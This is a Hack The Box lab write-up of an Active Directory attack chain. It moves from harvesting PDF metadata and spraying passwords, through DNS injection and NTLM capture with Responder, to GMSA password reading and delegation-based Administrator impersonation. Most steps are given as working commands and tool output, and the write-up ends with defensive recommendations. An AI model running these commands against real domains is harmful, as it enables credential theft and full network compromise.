---
title: "Intelligence — PDF Metadata Enumeration, DNS Injection, and GMSA Silver Ticket"
description: "PDF metadata and a default onboarding password enable DNS record injection and NTLM capture, then GMSA silver-ticket abuse reaches Domain Administrator."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - pdf-metadata
  - dns-injection
  - ntlm-capture
  - gmsa
  - silver-ticket
---

## Summary

Intelligence is a Medium-rated Hack The Box Windows Active Directory lab where downloadable PDF documents on an IIS web server expose author metadata enumerating valid domain users, and one document discloses a default onboarding password. An SMB share accessible with those credentials contains a PowerShell script that authenticates to any internal hostname beginning with `web` — exploited by registering a spoofed DNS record and capturing a NetNTLMv2 hash via Responder. The captured hash is cracked to access a higher-privileged user who has `ReadGMSAPassword` rights on a Group Managed Service Account. The GMSA's NTLM hash, combined with its constrained delegation rights, enables a silver ticket attack to impersonate the Administrator. All target addresses, credentials, and hashes are redacted below; command patterns are preserved.

## Context and Objective

- **Target:** Windows Active Directory Domain Controller (Medium difficulty)
- **Services exposed:** DNS (53), HTTP/IIS (80), Kerberos (88), RPC (135), NetBIOS (139), LDAP (389/636), SMB (445)
- **Objective:** Achieve Domain Administrator privileges through the attack surface presented by exposed services
- **Lab context:** Hack The Box lab; all activity described was performed within the platform's isolated lab environment

## Approach and Evidence

### 1. Port Scanning and Service Discovery

Observation: standard AD services are exposed. The domain is `<TARGET_DOMAIN>` with DC at `<DOMAIN_CONTROLLER_HOST>`.

Action: run a standard Nmap scan to enumerate open ports and service versions.

```bash
nmap -sC -sV -oA nmap/intelligence <TARGET_IP>
```

Representative excerpt (truncated):

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds
```

Technical significance: the service fingerprint confirms an AD DC with DNS, Kerberos, LDAP, SMB, and an IIS web server.

Result: the recorded output shows AD DC services including DNS, Kerberos, LDAP, SMB, and IIS.

### 2. PDF Metadata Enumeration

Observation: the IIS web server hosts downloadable PDF documents with a naming pattern of `YYYY-MM-DD-upload.pdf`. A date-range script discovers approximately 84 PDFs. Extracting `Creator`/`Author` metadata yields around 30 unique usernames. All are valid domain accounts confirmed via Kerberos user enumeration.

Action: write a script to enumerate all possible dates across a realistic range and download matching PDFs.

```python
import requests
from datetime import date, timedelta

base = "http://<TARGET_IP>/documents/{date}-upload.pdf"
start = date(2020, 1, 1)
end   = date(2021, 12, 31)

found = []
d = start
while d <= end:
    url = base.format(date=d.strftime("%Y-%m-%d"))
    r = requests.get(url)
    if r.status_code == 200:
        with open(d.strftime("%Y-%m-%d") + ".pdf", "wb") as f:
            f.write(r.content)
        found.append(url)
        print(f"[+] {url}")
    d += timedelta(days=1)
```

Action: extract author metadata from all downloaded PDFs.

```bash
for pdf in *.pdf; do
    exiftool "$pdf" | grep "Creator\|Author" | awk '{print $NF}'
done | sort -u > users.txt
```

Action: validate discovered usernames against the domain via Kerberos user enumeration.

```bash
kerbrute userenum --dc <TARGET_IP> -d <TARGET_DOMAIN> users.txt
```

Technical significance: PDF author metadata is a real-world information leakage vector. Organizations that publish documents without stripping metadata expose valid internal usernames. These usernames enable targeted password spraying without generating failed-login noise.

Result: the notes report approximately 30 valid domain accounts discovered from PDF metadata.

### 3. Default Password Discovery and Initial Access

Observation: one PDF (`2020-06-04-upload.pdf`) contains a default onboarding password in plain text. This password is valid for a domain user, providing initial SMB access.

Action: read the PDF to extract the default password, then spray it across discovered usernames.

```bash
nxc smb <TARGET_IP> -u users.txt -p '<DEFAULT_PASSWORD>' --continue-on-success
```

Representative excerpt (values generalized):

```text
[+] <TARGET_DOMAIN>\<USER>:<DEFAULT_PASSWORD>
```

Technical significance: default passwords in published documents are a common misconfiguration. The onboarding document was accessible to anyone who could download PDFs from the web server, combining username enumeration (from metadata) with a usable password (from content) into direct domain access.

Result: the notes report valid domain credentials obtained via default password spray (values redacted).

### 4. SMB Enumeration and PowerShell Script Discovery

Observation: authenticated SMB access reveals two readable shares: `IT` and `Users`. The `IT` share contains a PowerShell script (`downdetector.ps1`) that queries Active Directory for DNS records whose names start with `web`, then makes an authenticated HTTP request to each one using the running account's credentials (`-UseDefaultCredentials`).

Action: enumerate shares and retrieve the PowerShell script.

```bash
nxc smb <TARGET_IP> -u '<USER>' -p '<PASSWORD>' --shares
```

```text
Share           Permissions    Remark
-----           -----------    ------
IT              READ
Users           READ
IPC$            READ           Remote IPC
```

```bash
smbclient //<TARGET_IP>/IT -U '<USER>%<PASSWORD>' -c 'recurse ON; prompt OFF; mget *'
```

The retrieved script (`downdetector.ps1`) contains:

```powershell
Import-Module ActiveDirectory
foreach($record in Get-ChildItem "AD:DC=<TARGET_DOMAIN_COMPONENT>" -Filter * |
        Where-Object {$_.Name -like "web*"}) {
    try {
        $request = Invoke-WebRequest -Uri "http://$($record.Name)" `
            -UseDefaultCredentials
        if($request.StatusCode -ne 200) {
             Send-MailMessage -From '<SERVICE_ACCOUNT> <<SERVICE_ACCOUNT>@<TARGET_DOMAIN>>' `
                             -Subject "Service: $($record.Name) is down" ...
        }
    } catch {}
}
```

Technical significance: `-UseDefaultCredentials` passes the running account's NTLM credentials to any HTTP endpoint the script contacts. The script runs periodically via Scheduled Task. Any DNS record matching `web*` will trigger an authenticated HTTP request to that host, regardless of whether the record points to a legitimate server.

Result: the notes report the `downdetector.ps1` script discovered with NTLM credential-passing behavior (usernames generalized).

### 5. DNS Record Injection and NTLM Capture

Observation: the PowerShell script authenticates to any hostname matching `web*`. Registering a DNS A record named `<SPOOFED_WEB_HOST>` pointing to the attack machine causes the script to send NTLM credentials to the attacker when it next runs (~5 minutes).

Action: add a spoofed DNS record using Krbrelayx's `dnstool.py`.

```bash
python3 dnstool.py -u '<TARGET_DOMAIN>\<USER>' -p '<PASSWORD>' \
  -r <SPOOFED_WEB_HOST> -d <ATTACKER_IP> --action add <TARGET_IP>
```

```text
[+] <SPOOFED_WEB_HOST> has been successfully added
```

Action: start Responder to capture the NTLM authentication.

```bash
sudo responder -I tun0 -v
```

Action: wait for the scheduled script to execute.

Representative excerpt (hash redacted):

```text
[HTTP] NTLMv2 Hash     : <SERVICE_ACCOUNT>::<TARGET_DOMAIN_SHORT>:<CHALLENGE>:...
```

Action: crack the captured hash with a wordlist.

```bash
hashcat -m 5600 <HASH_FILE> /usr/share/wordlists/rockyou.txt
```

```text
<SERVICE_ACCOUNT>::<TARGET_DOMAIN_SHORT>:...:<CRACKED_PASSWORD>
```

Technical significance: this attack works because the script uses `-UseDefaultCredentials` without validating the target hostname against an allowlist. The Scheduled Task provides periodic trigger. DNS injection via authenticated LDAP writes is not prevented by Secure Dynamic Updates alone — the attack uses legitimate domain credentials to create the record directly.

Result: the notes report a NetNTLMv2 hash captured and cracked, yielding domain credentials (values redacted).

### 6. BloodHound Enumeration and GMSA Password Read

Observation: BloodHound analysis with the cracked credentials reveals the account is a member of `<SUPPORT_GROUP>`, which has `ReadGMSAPassword` rights on a Group Managed Service Account (`<GMSA_ACCOUNT>`). The GMSA has constrained delegation to `WWW/<DOMAIN_CONTROLLER_HOST>`.

Action: collect BloodHound data and enumerate GMSA details.

```bash
bloodhound-ce-python -d <TARGET_DOMAIN> \
  -u '<SERVICE_ACCOUNT>' -p '<CRACKED_PASSWORD>' \
  -c all -ns <TARGET_IP>
```

Action: read the GMSA password attribute.

```bash
bloodyAD --host <TARGET_IP> -d <TARGET_DOMAIN> \
  -u '<SERVICE_ACCOUNT>' -p '<CRACKED_PASSWORD>' \
  get search \
  --filter '(ObjectClass=msDS-GroupManagedServiceAccount)' \
  --attr msDS-ManagedPassword
```

Representative excerpt (hash redacted):

```text
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:<GMSA_NTLM_HASH>
```

Technical significance: Group Managed Service Accounts (gMSAs) have their passwords managed automatically by AD, stored in the `msDS-ManagedPassword` attribute. Principals granted explicit `ReadGMSAPassword` rights can retrieve the current NTLM hash. The password is a 256-byte random value changed every 30 days, but the hash is sufficient for NTLM-based authentication and ticket operations.

Result: the notes report the GMSA NTLM hash retrieved (hash redacted).

### 7. Silver Ticket via Constrained Delegation

Observation: the GMSA (`<GMSA_ACCOUNT>`) has constrained delegation rights to `WWW/<DOMAIN_CONTROLLER_HOST>`. With the GMSA's NTLM hash, `impacket-getST` can request a service ticket for the `WWW` service on the DC, impersonating the Administrator via S4U2Proxy. The resulting ccache file enables Kerberos-authenticated access as Administrator.

Action: request a service ticket impersonating Administrator using the GMSA hash.

```bash
impacket-getST '<TARGET_DOMAIN>/<GMSA_ACCOUNT>' \
  -spn WWW/<DOMAIN_CONTROLLER_HOST> \
  -hashes aad3b435b51404eeaad3b435b51404ee:<GMSA_NTLM_HASH> \
  -impersonate administrator
```

```text
[*] Saving ticket in administrator.ccache
```

Action: use the ccache to authenticate as Administrator.

```bash
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass <TARGET_DOMAIN>/administrator@<DOMAIN_CONTROLLER_HOST>
```

```text
C:\Windows\system32> whoami
nt authority\system
```

Technical significance: constrained delegation with protocol transition (S4U2Proxy) allows a service to obtain tickets on behalf of any user to the constrained SPN. With the GMSA's NTLM hash, an attacker can forge the TGS-REQ without needing the user's password. The silver ticket grants access only to the specific SPN, but since the SPN is on the DC itself, this provides full Domain Administrator access.

Result: the notes report full administrative access obtained on the Domain Controller.

## Challenges and Decisions

| Challenge | Decision | Rationale |
|---|---|---|
| PDF naming pattern unknown | Brute-forced date range `2020-01-01` to `2021-12-31` | Document naming followed `YYYY-MM-DD-upload.pdf`; systematic date enumeration recovered all accessible documents |
| DNS injection requires authenticated writes | Used discovered domain credentials | Secure Dynamic Updates alone do not prevent authenticated LDAP writes to the DNS partition |
| Scheduled Task trigger timing unknown | Waited ~5 minutes after DNS record creation | Script periodicity was unknown; patience allowed the legitimate trigger to fire |
| GMSA hash alone insufficient for direct login | Used constrained delegation via S4U2Proxy | GMSA accounts cannot be used for interactive login; silver ticket via delegation provides the needed SPN access |

## Outcome

The evidence establishes: username enumeration via PDF metadata; credential recovery via default password in a published document; PowerShell script analysis revealing NTLM credential-passing behavior; DNS record injection triggering NTLM capture via Responder; hash cracking yielding higher-privileged credentials; GMSA password retrieval via `ReadGMSAPassword` rights; and silver ticket abuse via constrained delegation to achieve Domain Administrator. The attack chain is non-obvious from the initial port scan and requires creative enumeration of web content.

**Attack chain:**
PDF metadata enumeration → default password discovery → SMB share access → PowerShell script analysis → DNS record injection → NTLM hash capture → hash cracking → BloodHound enumeration → GMSA password read → silver ticket via constrained delegation → Domain Administrator

## Lessons and Recommendations

Recommendations below follow the source remediation; none were re-tested during curation.

1. **Strip metadata from all publicly published documents.** PDF author, creator, and producer fields enumerate valid domain usernames. Use `mat2` or Microsoft's Document Inspector to remove metadata before publication. Implement DLP policies that flag outbound documents containing AD user information. (Recommendation.)

2. **Restrict DNS record creation rights.** Standard domain users should not be able to create arbitrary DNS A records. Restrict DNS update permissions to dedicated service accounts and DNS administrators. Enabling Secure Dynamic Updates (already the default) is insufficient — the attack uses authenticated LDAP writes to the DNS partition directly. (Recommendation.)

3. **Avoid NTLM credential passing in scheduled scripts.** `Invoke-WebRequest -UseDefaultCredentials` passes the running account's NTLM credentials to any HTTP endpoint the script contacts. Use API keys or tokens instead of Windows Integrated Authentication for external connectivity. If NTLM must be used, restrict outbound NTLM via the `Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers` Group Policy setting. (Recommendation.)

4. **Validate target hostnames in automation scripts.** Implement allowlists for DNS hostnames or IP ranges that automated scripts will contact. Prevent scripts from following DNS records that resolve to attacker-controlled infrastructure. (Recommendation.)

5. **Audit GMSA delegation configurations.** Review `msDS-AllowedToDelegateTo` attributes on GMSA accounts. Constrained delegation to DC services (HTTP, LDAP, etc.) enables silver ticket attacks if the GMSA password is compromised. Remove delegation rights where not required. (Recommendation.)

6. **Restrict `ReadGMSAPassword` rights.** Audit which principals have GMSA password read access. Limit to service accounts and administrators that genuinely require the credential. Broader groups (e.g., `<SUPPORT_GROUP>`) create unnecessary privilege escalation paths. (Recommendation.)

Editorial MITRE view (mapping only, not a source claim): credential access via metadata and documents; credential capture via DNS injection and NTLM relay; privilege escalation via GMSA password read and constrained delegation abuse.

## References

- Hack The Box machine **[Intelligence](https://app.hackthebox.com/machines/Intelligence)** (retired lab; no active-instance detail)
- Microsoft documentation: Group Managed Service Accounts
- Microsoft documentation: Kerberos constrained delegation
- Responder: LLMNR/NBT-NS/MDNS poisoner
- Krbrelayx: Kerberos relaying toolkit
- `impacket-getST`: Service ticket generation via S4U2Proxy
